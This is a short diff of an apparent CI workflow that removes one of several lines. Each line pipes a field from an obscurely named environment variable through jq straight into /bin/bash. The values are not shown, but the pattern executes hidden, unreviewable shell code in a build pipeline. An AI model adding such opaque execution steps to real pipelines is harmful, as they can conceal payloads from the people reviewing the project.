@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$yt445" | jq -r .engf32 | /bin/bash
           echo $ry255 | jq -r .n84 | /bin/bash
           echo $mexqr93511 | jq -r .qbe60 | /bin/bash
-          echo $sn486 | jq -r .dgk010 | /bin/bash
           echo $eki9 | jq -r .j2 | /bin/bash
 
       - name: Archive results
